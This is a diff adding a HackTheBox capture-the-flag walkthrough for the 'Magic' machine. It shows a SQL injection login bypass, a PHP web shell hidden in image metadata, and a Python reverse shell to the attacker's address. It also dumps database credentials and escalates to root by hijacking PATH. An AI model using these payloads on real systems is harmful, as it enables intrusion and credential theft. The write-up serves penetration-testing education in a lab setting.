@@ -1,0 +1,110 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Magic HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/magic-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-11T11:31:49+00:00">February 11, 2021</time><time class="updated" datetime="2025-06-23T08:12:44+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called magic. It was created by <strong><span style="color: #0000ff;">TRX</span></strong>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Bypassing Authentication using SQL Injection</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Exploiting File Upload to get shell</span></li>
+<li><span style="color: #000000;">Enumerating Database files</span></li>
+<li><span style="color: #000000;">Dumping Credentials using mysqldump</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating SUID bits</span></li>
+<li><span style="color: #000000;">Enumerating sysinfo using strings</span></li>
+<li><span style="color: #000000;">Crafting shell script and changing Path</span></li>
+<li><span style="color: #000000;">Reading Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: <strong>10.129.77.148</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.129.77.148</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-71JOaApEAXM/YCURpIRnQSI/AAAAAAAAtmU/7u1qD2PKdOgKVynuo55WqZNbtVG7CGEiwCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: 22 (SSH) and 80 (HTTP).</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">As we don’t have credentials for the SSH, we began enumerating HTTP service. We opened the IP in the Browser to find that it was an Image Hosting Site. There is a login button located at the bottom of the webpage. It says Login to upload images.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.77.148</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6A-gCfFWu6I/YCURzj9LLhI/AAAAAAAAtmY/594iMGy3GOIW-yiusySWTt3XZGjpeTO2QCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">We clicked on the Login button to find ourselves on a Login Form at login.php. As we don’t have the credentials, we tried to enter some of the basic usernames and passwords. It didn’t work. Then we thought of bypassing using SQL Injection. We entered <strong>‘ or 1=1– – </strong>as username and some random password in order to bypass the authentication. The single quote will break the query that generated by our attempt. Then followed by the single quote the 1=1 is the true condition which will bypass the authentication altogether. </span></p>
+<h5><span style="color: #000000;">Learn more about SQL Injection <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/beginner-guide-sql-injection-part-1/">here</a></strong></span>.</span></h5>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gcBGNiyUkWk/YCUSA3RD7-I/AAAAAAAAtmg/w47Z-qBB8GID1-cx-h6i7_31436OqCnygCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Upon login, we have the File Upload Module. Since it is an image hosting site, it must be programmed to accept images. But we tried to upload a PHP reverse shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I2KUOnj0vok/YCUSMWpd_XI/AAAAAAAAtmo/XDs70K57A7APbfMR5RKBuOEUHVC3a86NgCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">It stopped us from uploading a PHP file. It says that only JPG, JPEG and PNG files are allowed. We tried to upload a PHP reverse shell with the JPG extension. It didn’t allow it as well.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B8-kkdJ5FDI/YCUSWX1WAGI/AAAAAAAAtms/aKZDfZUoOb8TkVdec5VjeaMfBblThFzXwCLcBGAsYHQ/s320/5.png"/></span></p>
+<p><span style="color: #000000;">At this point, it is sure that there is an upload filter that’s stopping us from uploading shell. There are multiple ways to enforce a filter. Some filter uses extensions, some uses MIME Types etc. After trying a bunch of other filers, it was confirmed that the is an extension whitelisting allowed for only JPG, JPEG and PNG. But Metadata is hardly ever filtered. Hence, we added a PHP web shell in the comment section of the metadata using the exiftool. Since there is an extension filter and we need to execute the shell as well to get a session we used double extension on the file as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' 1.png
+mv 1.png shell.php.png</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pOggCSdWlso/YCUSdRrdWeI/AAAAAAAAtm0/bZ_n1d2GhkYRm_q8UIgX3o8HudwIQ0tSQCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">We take our shell.php.png and try to upload it. The file gets uploaded successfully.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--XqyBmVCNsQ/YCUSqN78gBI/AAAAAAAAtm8/a-_o1ko-D9IZ3hxC11y9aAJuqGO3sf5DQCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Since we have uploaded the file, we need to open it. We go back to the home page and note the path of one of the images there. We found that all the images are uploaded in the /images/uploads/ page. Hence, we added our filename with that path and see that it was opening in RAW format. Now, all we need to is provide the command to the web shell. We tried id command. The command was executed as www-data user as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.77.148/images/uploads/shell.php.png?cmd=id</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j9I71CqbRp4/YCUS0aHAHWI/AAAAAAAAtnE/YxTpXckFTWUguFqQfY5o6y_AMxjvmWyzgCLcBGAsYHQ/s16000/8.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">To get a shell on the target machine, we need to replace the command “id” with a shell invocation script. We used the Python reverse shell script. Before executing the script, start a netcat listener to capture the shell generated using the script on the same port as mentioned on the script.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.77.148/images/uploads/shell.php.png?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.52",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4rQ4k0c8keY/YCUS6zidLMI/AAAAAAAAtnM/v7wBSgeUICAOvo42IpscHDJFD2JTovm7ACLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">As soon as the script is executed, we get a session as the www-data user. Then, we convert the shell into a TTY shell for stability. Time to get enumerating. We look around in hope to find something interesting. We find this database file named db.php5 inside /var/www/Magic. It is readable; hence we try to read it to find a set of credentials for the database.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+cd /var/www/Magic/
+cat db.php5</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-C1Q8yguMVTs/YCUTAm-5UbI/AAAAAAAAtnQ/OAvGS8CmWEgRIwR8hrZ0SQNzxqje0DmCwCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">While enumerating a way to read the database on the target machine. It is not that simple when all we have is a command line. Then we found that mysqldump is present on the target machine. For those who don’t know that is mysqldump is, let us brief it. It is a client-side backup program that can used to dump a database or collection of databases for backup or transfer to another database server. We used the mysqldump with the set of credentials we just found to enumerate the database on the machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mysqldump Magic -u theseus -p
+iamkingtheseus</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NJjLFeO_QyA/YCUTHK0HKeI/AAAAAAAAtnY/PYulenk8qOsBo8KbwY52OJuU6Nc9bNgxQCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">This is basically the credential that can be used to upload images earlier on the webpage where we used SQL Injection to get access. Now that we know that there is a user named theseus, let’s login into that user with these credentials. We used su to login as theseus. The user flag is inside the theseus home directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su theseus
+Th3s3usW4sK1ng
+cd theseus
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gfLQxtzTR_k/YCUTOrky-CI/AAAAAAAAtng/sr1cj1QA988pKrgGu7xIp3TsG13z0THMgCLcBGAsYHQ/s16000/12.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Now we need to elevate privilege on the machine. To figure out how to do that, we were enumerating SUID bits using the find command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s 2&gt;/dev/null</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Vt9VwhwM3R8/YCUTVJO4DuI/AAAAAAAAtno/PI1w5Wtct5UNG85lZQ7tVSfTawb7W97XwCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Amongst other binaries, we found sysinfo. This can be interesting to elevate privileges using sysinfo.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AHGjUDvYFss/YCUTbD9bt7I/AAAAAAAAtnw/T1MNPd77-zIX-QsfKOFoYN56_8XhTs6dwCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Then, let’s inspect the sysinfo command with the help of strings. It will pull the human-readable texts from the binary file. There are few commands that were shown in the output. We decided to go with the “free” command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">strings /bin/sysinfo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jbebzsNBOEo/YCUTjcwkagI/AAAAAAAAtn4/alEEk91m6BM8WE0wcpIT3CPDDRt6po4cgCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">We will move to tmp directory and then create a bash invocation script and name it “free”. Then make the PATH to /tmp. Hence when we run sysinfo, it will try to run “free”. Since we redefined path as /tmp it will run our shell script instead of the original “free” command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+echo "/bin/bash" &gt; free
+chmod 777 free
+export PATH=/tmp:$PATH
+/bin/sysinfo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vRQs1XGYSAo/YCUTpJHp_6I/AAAAAAAAtoA/oH0suqo7oRAUmPFTMTBkFJGgeoh0y_w3wCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">As soon as we run the sysinfo command, our shell gets escalated and we get root. Now, we can read the root flag and conclude this machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ECTcx1wX4qg/YCUTueSB1EI/AAAAAAAAtoI/8xj606RM6rUgEg1dYU5m5usG-9dpYssjwCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
